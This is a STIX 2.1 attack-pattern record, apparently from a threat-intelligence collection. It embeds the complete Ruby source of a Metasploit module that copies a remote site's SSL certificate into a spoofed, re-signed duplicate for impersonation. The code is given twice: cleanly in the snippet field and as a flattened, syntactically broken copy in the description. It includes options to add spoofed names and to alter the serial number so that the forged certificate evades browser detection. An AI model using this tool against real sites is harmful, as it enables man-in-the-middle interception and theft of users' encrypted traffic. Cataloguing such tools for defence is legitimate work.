{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--775ca081-6ade-4365-9ff5-05ce76a8e190",
    "created": "2024-08-14T16:31:57.942474Z",
    "modified": "2024-08-14T16:31:57.942478Z",
    "name": "HTTP SSL Certificate Impersonation",
    "description": " This module request a copy of the remote SSL certificate and creates a local (self.signed) version using the information from the remote version. The module then Outputs (PEM|DER) format private key / certificate and a combined version for use in Apache or other Metasploit modules requiring SSLCert Inputs for private key / CA cert have been provided for those with DigiNotar certs hanging about!  ) )  register_options( [ Opt::RPORT(443) OptString.new('SSLServerNameIndication', [ false, 'SSL/TLS Server Name Indication (SNI)', nil], aliases: ['SNI']) OptEnum.new('OUT_FORMAT', [true, 'Output format', 'PEM', ['DER', 'PEM']]) OptString.new('EXPIRATION', [false, 'Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)', nil]) OptPath.new('PRIVKEY', [false, 'Sign the cert with your own CA private key', nil]) OptString.new('PRIVKEY_PASSWORD', [false, 'Password for private key specified in PRIV_KEY (if applicable)', nil]) OptPath.new('CA_CERT', [false, 'CA Public certificate', nil]) OptString.new('ADD_CN', [false, 'Add CN to match spoofed site name (e.g. *.example.com)', nil]) OptString.new('ADD_SAN', [false, 'Add SAN entries to certificate (e.g. alt.example.com,127.0.0.1)', nil]) ] )  register_advanced_options( [ OptBool.new('AlterSerial', [false, 'Alter the serial number slightly to avoid FireFox serial matching', true]) ] ) end  def get_cert(rhost, rport, sni) info_hash = {'PeerHost' => sni, 'PeerAddr' => rhost, 'PeerPort' => rport.to_s sslSocket = Rex::Socket::SslTcp.create(info_hash) cert = sslSocket.peer_cert sslSocket.close cert end  def run if !datastore['SSLServerNameIndication'].nil? sni = datastore['SSLServerNameIndication'] print_status(\"Connecting to #{rhost}:#{rport} SNI:#{sni}\") else sni = false print_status(\"Connecting to #{rhost}:#{rport}\") end  if !datastore['PRIVKEY'].nil? && !datastore['CA_CERT'].nil? print_status('Signing generated certificate with provided PRIVATE KEY and CA Certificate') if !datastore['PRIVKEY_PASSWORD'].nil? && !datastore['PRIVKEY_PASSWORD'].empty? ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']), datastore['PRIVKEY_PASSWORD']) else ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY'])) end ca = OpenSSL::X509::Certificate.new(File.read(datastore['CA_CERT'])) elsif !datastore['PRIVKEY'].nil? || !datastore['CA_CERT'].nil? # error if both PRIVKEY and CA_CERT are not BOTH provided print_error('CA Certificate AND Private Key must be provided!') return end  begin cert = get_cert(rhost, rport, sni) disconnect rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout rescue ::Timeout::Error, ::Errno::EPIPE => e print_error(e.message) end  if !cert print_error(\"#{rhost}:#{rport} No certificate subject or CN found\") return end  print_status(\"Copying certificate from #{rhost}:#{rport}\\n#{cert.subject} \") vprint_status(\"Original Certifcate Details\\n\\n#{cert.to_text}\")  begin keylength = /Key: \\((\\d+)/i.match(cert.signature_algorithm)[1] # Grab keylength from target cert rescue StandardError keylength = 1024 end  begin hashtype = /Algorithm: (\\w+)With/i.match(cert.to_text)[1] # Grab hashtype from target cert rescue StandardError hashtype = 'sha1' end  new_cert = OpenSSL::X509::Certificate.new ef = OpenSSL::X509::ExtensionFactory.new  # Duplicate information from the remote certificate entries = ['version', 'serial', 'subject', 'not_before', 'not_after'] entries.each do |ent| new_cert.send(\"#{ent}=\", cert.send(ent)) end  # add additional Common Name to the new cert if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty? new_cert.subject = OpenSSL::X509::Name.new(new_cert.subject.to_a << ['CN', datastore['ADD_CN'].to_s]) print_status(\"Adding #{datastore['ADD_CN']} to the end of the certificate subject\") vprint_status(\"Certificate Subject: #{new_cert.subject}\") end  if !datastore['EXPIRATION'].nil? && !datastore['EXPIRATION'].empty? # alter the not_after and not_before dates print_status(\"Altering certificate expiry information to #{datastore['EXPIRATION']}\")  case datastore['EXPIRATION'].downcase when 'yesterday' new_cert.not_after = 24.hours.ago new_cert.not_before = 1.year.ago - 24.hours # set start date (1 year cert) when 'now' new_cert.not_after = Time.now new_cert.not_before = 1.year.ago # set start date (1 year cert) else new_cert.not_after = Time.parse(datastore['EXPIRATION']) new_cert.not_before = Time.parse(datastore['EXPIRATION']) - 1.year # set start date (1 year cert) end vprint_status(\"Certificate expiry date set to #{new_cert.not_after}\") end  # Alter serial to avoid duplicate issuer/serial detection if datastore['AlterSerial'] if (cert.serial.to_s.length > 1) # alter last digits of the serial number new_cert.serial = (cert.serial.to_s[0..-2] + rand(0xFF).to_s).to_i else # serial is too small, create random serial vprint_error('The serial number of the original cert is too short. Creating new random serial') new_cert.serial = rand(0xFFFF) end else # match serial number new_cert.serial = cert.serial.to_s end  if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty? new_cert.public_key = ca_key.public_key ef.subject_certificate = ca ef.issuer_certificate = ca new_cert.issuer = ca.subject print_status(\"Using private key #{datastore['PRIVKEY']}\") else new_key = OpenSSL::PKey::RSA.new(keylength.to_i) new_cert.public_key = new_key.public_key ef.subject_certificate = new_cert ef.issuer_certificate = new_cert if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty? new_cert.issuer = new_cert.subject else new_cert.issuer = cert.subject end end  new_cert.extensions = [ ef.create_extension('basicConstraints', 'CA:FALSE', true) ef.create_extension('subjectKeyIdentifier', 'hash') ]  # Add additional SAN entries to the new cert. See https://support.f5.com/csp/article/K13471 # for an example of how this added SAN field is expected to look like in a certificate. if !datastore['ADD_SAN'].nil? && !datastore['ADD_SAN'].empty? sans = datastore['ADD_SAN'].to_s.split(/,/) sans.map! do |san| san = (san =~ Resolv::IPv4::Regex || san =~ Resolv::IPv6::Regex) ? \"IP:#{san}\" : \"DNS:#{san}\" end new_cert.add_extension(ef.create_extension('subjectAltName', sans.join(','), false)) print_status(\"Adding #{datastore['ADD_SAN']} to the certificate subject alternative names\") end  if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty? new_cert.sign(ca_key, OpenSSL::Digest.new(hashtype)) new_key = ca_key # Set for file output else new_cert.sign(new_key, OpenSSL::Digest.new(hashtype)) end  vprint_status(\"Duplicate Certificate Details\\n\\n#{new_cert.to_text}\") print_status('Beginning export of certificate files')  priv_key = new_key.send(\"to_#{datastore['OUT_FORMAT'].downcase}\") cert_crt = new_cert.send(\"to_#{datastore['OUT_FORMAT'].downcase}\") combined = new_key.send('to_pem') + new_cert.send('to_pem')  addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB  print_status(\"Creating looted key/crt/pem files for #{rhost}:#{rport}\")  p = store_loot(\"#{datastore['RHOST'].downcase}_key\", datastore['OUT_FORMAT'].downcase, addr, priv_key, 'imp_ssl.key', 'Impersonate_SSL') print_good(\"key: #{p}\")  p = store_loot(\"#{datastore['RHOST'].downcase}_cert\", datastore['OUT_FORMAT'].downcase, addr, cert_crt, 'imp_ssl.crt', 'Impersonate_SSL') print_good(\"crt: #{p}\")  p = store_loot(\"#{datastore['RHOST'].downcase}_pem\", 'pem', addr, combined, 'imp_ssl.pem', 'Impersonate_SSL') print_good(\"pem: #{p}\")  end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/impersonate_ssl.rb",
            "external_id": "impersonate_ssl.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.slideshare.net/ChrisJohnRiley/ssl-certificate-impersonation-for-shits-andgiggles"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Rex::Socket::SslTcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HTTP SSL Certificate Impersonation',\n        'Author' => 'Chris John Riley',\n        'References' =>\n            [\n              ['URL', 'https://www.slideshare.net/ChrisJohnRiley/ssl-certificate-impersonation-for-shits-andgiggles']\n            ],\n        'License' => MSF_LICENSE,\n        'Description' => %q{\n          This module request a copy of the remote SSL certificate and creates a local\n          (self.signed) version using the information from the remote version. The module\n          then Outputs (PEM|DER) format private key / certificate and a combined version\n          for use in Apache or other Metasploit modules requiring SSLCert Inputs for private\n          key / CA cert have been provided for those with DigiNotar certs hanging about!\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('SSLServerNameIndication', [ false, 'SSL/TLS Server Name Indication (SNI)', nil], aliases: ['SNI']),\n        OptEnum.new('OUT_FORMAT', [true, 'Output format', 'PEM', ['DER', 'PEM']]),\n        OptString.new('EXPIRATION', [false, 'Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)', nil]),\n        OptPath.new('PRIVKEY', [false, 'Sign the cert with your own CA private key', nil]),\n        OptString.new('PRIVKEY_PASSWORD', [false, 'Password for private key specified in PRIV_KEY (if applicable)', nil]),\n        OptPath.new('CA_CERT', [false, 'CA Public certificate', nil]),\n        OptString.new('ADD_CN', [false, 'Add CN to match spoofed site name (e.g. *.example.com)', nil]),\n        OptString.new('ADD_SAN', [false, 'Add SAN entries to certificate (e.g. alt.example.com,127.0.0.1)', nil])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('AlterSerial', [false, 'Alter the serial number slightly to avoid FireFox serial matching', true])\n      ]\n    )\n  end\n\n  def get_cert(rhost, rport, sni)\n    info_hash = {'PeerHost' => sni, 'PeerAddr' => rhost, 'PeerPort' => rport.to_s}\n    sslSocket = Rex::Socket::SslTcp.create(info_hash)\n    cert = sslSocket.peer_cert\n    sslSocket.close\n    cert\n  end\n\n  def run\n    if !datastore['SSLServerNameIndication'].nil?\n      sni = datastore['SSLServerNameIndication']\n      print_status(\"Connecting to #{rhost}:#{rport} SNI:#{sni}\")\n    else\n      sni = false\n      print_status(\"Connecting to #{rhost}:#{rport}\")\n    end\n\n    if !datastore['PRIVKEY'].nil? && !datastore['CA_CERT'].nil?\n      print_status('Signing generated certificate with provided PRIVATE KEY and CA Certificate')\n      if !datastore['PRIVKEY_PASSWORD'].nil? && !datastore['PRIVKEY_PASSWORD'].empty?\n        ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']), datastore['PRIVKEY_PASSWORD'])\n      else\n        ca_key = OpenSSL::PKey::RSA.new(File.read(datastore['PRIVKEY']))\n      end\n      ca = OpenSSL::X509::Certificate.new(File.read(datastore['CA_CERT']))\n    elsif !datastore['PRIVKEY'].nil? || !datastore['CA_CERT'].nil?\n      # error if both PRIVKEY and CA_CERT are not BOTH provided\n      print_error('CA Certificate AND Private Key must be provided!')\n      return\n    end\n\n    begin\n      cert = get_cert(rhost, rport, sni)\n      disconnect\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE => e\n      print_error(e.message)\n    end\n\n    if !cert\n      print_error(\"#{rhost}:#{rport} No certificate subject or CN found\")\n      return\n    end\n\n    print_status(\"Copying certificate from #{rhost}:#{rport}\\n#{cert.subject} \")\n    vprint_status(\"Original Certifcate Details\\n\\n#{cert.to_text}\")\n\n    begin\n      keylength = /Key: \\((\\d+)/i.match(cert.signature_algorithm)[1] # Grab keylength from target cert\n    rescue StandardError\n      keylength = 1024\n    end\n\n    begin\n      hashtype = /Algorithm: (\\w+)With/i.match(cert.to_text)[1] # Grab hashtype from target cert\n    rescue StandardError\n      hashtype = 'sha1'\n    end\n\n    new_cert = OpenSSL::X509::Certificate.new\n    ef = OpenSSL::X509::ExtensionFactory.new\n\n    # Duplicate information from the remote certificate\n    entries = ['version', 'serial', 'subject', 'not_before', 'not_after']\n    entries.each do |ent|\n      new_cert.send(\"#{ent}=\", cert.send(ent))\n    end\n\n    # add additional Common Name to the new cert\n    if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty?\n      new_cert.subject = OpenSSL::X509::Name.new(new_cert.subject.to_a << ['CN', datastore['ADD_CN'].to_s])\n      print_status(\"Adding #{datastore['ADD_CN']} to the end of the certificate subject\")\n      vprint_status(\"Certificate Subject: #{new_cert.subject}\")\n    end\n\n    if !datastore['EXPIRATION'].nil? && !datastore['EXPIRATION'].empty?\n      # alter the not_after and not_before dates\n      print_status(\"Altering certificate expiry information to #{datastore['EXPIRATION']}\")\n\n      case datastore['EXPIRATION'].downcase\n      when 'yesterday'\n        new_cert.not_after = 24.hours.ago\n        new_cert.not_before = 1.year.ago - 24.hours # set start date (1 year cert)\n      when 'now'\n        new_cert.not_after = Time.now\n        new_cert.not_before = 1.year.ago # set start date (1 year cert)\n      else\n        new_cert.not_after = Time.parse(datastore['EXPIRATION'])\n        new_cert.not_before = Time.parse(datastore['EXPIRATION']) - 1.year # set start date (1 year cert)\n      end\n      vprint_status(\"Certificate expiry date set to #{new_cert.not_after}\")\n    end\n\n    # Alter serial to avoid duplicate issuer/serial detection\n    if datastore['AlterSerial']\n      if (cert.serial.to_s.length > 1)\n        # alter last digits of the serial number\n        new_cert.serial = (cert.serial.to_s[0..-2] + rand(0xFF).to_s).to_i\n      else\n        # serial is too small, create random serial\n        vprint_error('The serial number of the original cert is too short. Creating new random serial')\n        new_cert.serial = rand(0xFFFF)\n      end\n    else\n      # match serial number\n      new_cert.serial = cert.serial.to_s\n    end\n\n    if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty?\n      new_cert.public_key = ca_key.public_key\n      ef.subject_certificate = ca\n      ef.issuer_certificate = ca\n      new_cert.issuer = ca.subject\n      print_status(\"Using private key #{datastore['PRIVKEY']}\")\n    else\n      new_key = OpenSSL::PKey::RSA.new(keylength.to_i)\n      new_cert.public_key = new_key.public_key\n      ef.subject_certificate = new_cert\n      ef.issuer_certificate = new_cert\n      if !datastore['ADD_CN'].nil? && !datastore['ADD_CN'].empty?\n        new_cert.issuer = new_cert.subject\n      else\n        new_cert.issuer = cert.subject\n      end\n    end\n\n    new_cert.extensions = [\n      ef.create_extension('basicConstraints', 'CA:FALSE', true),\n      ef.create_extension('subjectKeyIdentifier', 'hash'),\n    ]\n\n    # Add additional SAN entries to the new cert. See https://support.f5.com/csp/article/K13471\n    # for an example of how this added SAN field is expected to look like in a certificate.\n    if !datastore['ADD_SAN'].nil? && !datastore['ADD_SAN'].empty?\n      sans = datastore['ADD_SAN'].to_s.split(/,/)\n      sans.map! do |san|\n        san = (san =~ Resolv::IPv4::Regex || san =~ Resolv::IPv6::Regex) ? \"IP:#{san}\" : \"DNS:#{san}\"\n      end\n      new_cert.add_extension(ef.create_extension('subjectAltName', sans.join(','), false))\n      print_status(\"Adding #{datastore['ADD_SAN']} to the certificate subject alternative names\")\n    end\n\n    if !datastore['PRIVKEY'].nil? && !datastore['PRIVKEY'].empty?\n      new_cert.sign(ca_key, OpenSSL::Digest.new(hashtype))\n      new_key = ca_key # Set for file output\n    else\n      new_cert.sign(new_key, OpenSSL::Digest.new(hashtype))\n    end\n\n    vprint_status(\"Duplicate Certificate Details\\n\\n#{new_cert.to_text}\")\n    print_status('Beginning export of certificate files')\n\n    priv_key = new_key.send(\"to_#{datastore['OUT_FORMAT'].downcase}\")\n    cert_crt = new_cert.send(\"to_#{datastore['OUT_FORMAT'].downcase}\")\n    combined = new_key.send('to_pem') + new_cert.send('to_pem')\n\n    addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB\n\n    print_status(\"Creating looted key/crt/pem files for #{rhost}:#{rport}\")\n\n    p = store_loot(\"#{datastore['RHOST'].downcase}_key\", datastore['OUT_FORMAT'].downcase, addr, priv_key, 'imp_ssl.key', 'Impersonate_SSL')\n    print_good(\"key: #{p}\")\n\n    p = store_loot(\"#{datastore['RHOST'].downcase}_cert\", datastore['OUT_FORMAT'].downcase, addr, cert_crt, 'imp_ssl.crt', 'Impersonate_SSL')\n    print_good(\"crt: #{p}\")\n\n    p = store_loot(\"#{datastore['RHOST'].downcase}_pem\", 'pem', addr, combined, 'imp_ssl.pem', 'Impersonate_SSL')\n    print_good(\"pem: #{p}\")\n\n  end\nend\n",
    "x_mitre_contributors": [
        "Chris John Riley",
        ""
    ]
}